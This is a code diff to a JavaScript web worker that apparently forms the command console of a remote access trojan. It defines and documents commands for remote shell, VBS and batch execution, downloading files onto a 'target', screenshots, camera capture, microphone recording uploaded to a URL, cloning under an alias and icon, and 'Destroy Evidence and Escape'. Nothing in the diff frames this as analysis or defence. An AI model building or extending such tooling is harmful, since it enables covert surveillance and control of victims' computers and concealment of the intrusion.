@@ -56,7 +56,7 @@ onmessage = function (event) {
  const dictionary = (fn, args) => {
   switch (fn) {
    case "Excape":
-    txt += "<br>-Execute Batch script and Escape()";
+    txt += "<br>-Execute commands and Escape()";
     break;
    case "Escape":
     txt += "<br>-Destroy Evidence and Escape";
@@ -68,61 +68,58 @@ onmessage = function (event) {
     txt += "<br>-End Execution temporarily.";
     break;
    case "Update":
-    txt += "<br>-Updates self";
+    txt += "<br>-Updates firmware file";
     break;
    case "Hibernate":
-    txt += "<br>- till date";
+    txt += "<br>- Hibernate till date";
     break;
    case "Revive":
-    txt += "<br>-End Hibernation  ";
+    txt += "<br>-End Hibernation";
     break;
    case "Rename":
-    txt += "<br>-Renames RAT";
+    txt += "<br>-Renames RAT permanently";
     break;
    case "Flash":
-    txt += "<br>-Flashes Screen, Visual Indication";
+    txt += "<br>-Flashes Screen As a Visual Indication";
     break;
    case "Vbs":
-    txt += "<br>-Runs .VBS Script";
+    txt += "<br>-Runs .VBS Script remotely";
     break;
    case "Bat":
-    txt += "<br>-Runs .Bat Script";
+    txt += "<br>-Runs .Bat Script remotely";
     break;
    case "Shell":
-    txt += "<br>-Runs Shell Commands";
+    txt += "<br>-Executes Shell Commands remotely";
     break;
    case "Speak":
-    txt += "<br>-Text to Speech";
+    txt += "<br>-Text to Speech operation";
     break;
    case "Play":
-    txt += "<br>-Play a Remote (mp3) Audio File (URL)";
+    txt += "<br>-Play an .mp3 Audio File";
     break;
    case "Mic":
-    txt += "<br>-Records audio for 'x' ms";
-    break;
-   case "Lock":
-    txt += "<br>-Select Target";
+    txt += "<br>-Records audio for 'x' mins";
     break;
    case "Info":
-    txt += "<br>-Shows Info box";
+    txt += "<br>-Shows an Information box";
     break;
    case "Warn":
-    txt += "<br>-Shows Warning Box";
+    txt += "<br>-Shows a Warning Box";
     break;
    case "Error":
-    txt += "<br>-Shows Error box";
+    txt += "<br>-Shows an Error box";
     break;
    case "Timebox":
-    txt += "<br>-Shows Msg Box fo 'y' ms";
+    txt += "<br>-Shows a Message Box for 'x' ms";
     break;
    case "Google":
-    txt += "<br>-Googles selected Text";
+    txt += "<br>-Googles a selected Text";
     break;
    case "Web":
-    txt += "<br>-Navigates to 'x' url";
+    txt += "<br>-Navigates to custom url";
     break;
    case "Type":
-    txt += "<br>-Types custom text";
+    txt += "<br>-Types a specific text";
     break;
    case "Screenshot":
     txt += "<br>-Takes a Screenshot";
@@ -137,13 +134,13 @@ onmessage = function (event) {
     txt += "<br>-Retrieves Directory / Folder structures";
     break;
    case "Send":
-    txt += "<br>-Sends a File";
+    txt += "<br>-Sends a File (Uplinks)";
     break;
    case "Health":
     txt += "<br>-Reports back a RAT's working conditions.";
     break;
    case "Log":
-    txt += "<br>-Return list of active applications.";
+    txt += "<br>-Return list of Active applications.";
     break;
    case "Delay":
     txt += "<br>-Pause Execution temporarily for 'x' ms";
@@ -158,25 +155,19 @@ onmessage = function (event) {
     txt += "<br>-Stops Cloning Operations";
     break;
    case "Prompt":
-    txt += "<br>-Prompts user for an input.";
+    txt += "<br>-Prompts User for an input.";
     break;
    case "Disk":
-    txt += "<br>-Retrieves Disk Info";
+    txt += "<br>-Retrieves Disk Summary";
     break;
    case "Download":
     txt += "<br>-Downloads a file onto target.";
     break;
    case "ExecuteAt":
-    txt += "<br>-Executes script at specified time.";
-    break;
-   case "Class":
-    txt += "<br>-Selects a Group of Targets.";
-    break;
-   case "All":
-    txt += "<br>-Select All Available targets.";
+    txt += "<br>-Executes script only at specified time.";
     break;
   }
-  args === undefined ? (code += `${fn}()`) : (code += `${fn}(${JSON.stringify(args)})`);
+  args === undefined ? (code += `${fn}();`) : (code += `${fn}(${JSON.stringify(args)});`);
  };
 
  var PC = {
@@ -237,9 +228,6 @@ onmessage = function (event) {
   Camera: (x) => {
    !arr[0] && tarLock("Camera") && !argEmpty("Camera", x) && dictionary("Camera", x);
   },
-  Mic: (x) => {
-   !arr[0] && tarLock("Mic") && !argEmpty("Mic", x) && dictionary("Mic", x);
-  },
   Tree: (x) => {
    !arr[0] && tarLock("Tree") && !argEmpty("Tree", x) && dictionary("Tree", x);
   },
@@ -249,9 +237,32 @@ onmessage = function (event) {
   Prompt: (x) => {
    !arr[0] && tarLock("Prompt") && !argEmpty("Prompt", x) && dictionary("Prompt", x);
   },
-  //   Clone: (x, y) => {
-  //    !arr[0] && tarLock("Clone") && !argEmpty("Clone", x) && dictionary("Clone");
-  //   },
+  Clone: (x, y) => {
+   if (!arr[0]) {
+    if (tarLock("Clone")) {
+     if (x == undefined || y == undefined) {
+      arr[0] = true;
+      arr[1] = "Arguments Cannot be Empty";
+      arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Clone(<grn>Alias_name</grn>,<grn>Icon_url</grn>)<br><br>Compiler failed with exit code 1F04";
+     } else {
+      dictionary("Clone", [x, y]);
+     }
+    }
+   }
+  },
+  Mic: (x, y) => {
+   if (!arr[0]) {
+    if (tarLock("Mic")) {
+     if (x == undefined || y == undefined) {
+      arr[0] = true;
+      arr[1] = "Arguments Cannot be Empty";
+      arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Mic(<grn>upload_url</grn>,<grn>minutes</grn>)<br><br>Compiler failed with exit code 1F05";
+     } else {
+      dictionary("Mic", [x, y]);
+     }
+    }
+   }
+  },
 
   // For Multiple systems.
   Update: (x) => {
@@ -277,6 +288,9 @@ onmessage = function (event) {
   },
   Play: (x) => {
    !arr[0] && !argEmpty("Play", x) && dictionary("Play", x);
+  },
+  Info: (x) => {
+   !arr[0] && !argEmpty("Info", x) && dictionary("Info", x);
   },
   Warn: (x) => {
    !arr[0] && !argEmpty("Warn", x) && dictionary("Warn", x);
@@ -307,6 +321,17 @@ onmessage = function (event) {
   },
   ExecuteAt: (x) => {
    !arr[0] && !argEmpty("ExecuteAt", x) && dictionary("ExecuteAt", x);
+  },
+  Timebox: (a, b, c, d, e) => {
+   if (!arr[0]) {
+    if (a == undefined || b == undefined || c == undefined || d == undefined || e == undefined) {
+     arr[0] = true;
+     arr[1] = "Arguments Cannot be Empty";
+     arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Timebox(<grn>message</grn>,<grn>button</grn>,<grn>icon</grn>,<grn>title</grn>,<grn>timeout</grn>)<br><br>Compiler failed with exit code 1F06";
+    } else {
+     dictionary("Timebox", [a, b, c, d, e]);
+    }
+   }
   },
  };
 
